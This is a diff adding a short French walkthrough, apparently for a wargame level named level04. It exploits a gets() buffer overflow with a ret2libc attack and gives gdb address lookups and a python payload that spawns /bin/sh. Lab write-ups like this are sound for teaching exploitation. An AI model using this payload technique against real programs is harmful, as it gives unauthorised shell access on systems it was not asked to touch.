@@ -1,0 +1,19 @@
+Dans ce code il y a un appel a gets qui va nous permettre de provoquer un buffer overflow.
+Ensuite vue que dans le code a aucun moment il n'y a d'appel a un shell ou de lecture
+sur le fichier .pass on va donc faire appel a system puis a /bin/sh
+
+pour l'overflow lors de l'appel a gets on fait un soustraction de l'addresse stockée
+dans EBP par celle ou on ecrit sur la stack. Ca donne 152, on ajoute 4 pour ecraser
+les valeurs nuls et etre collé a la prochaine instruction. il nous suffit maintenant
+d'indiquer l'adresse a laquelle on veux sauter
+
+dans gdb:
+    p System
+        0xf7e6aed0
+
+    find 0xf7e6aed0,+9999999,"/bin/sh"
+        0xf7f897ec
+
+python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"' > /tmp/exploit
+
+cat /tmp/exploit - | ./level04
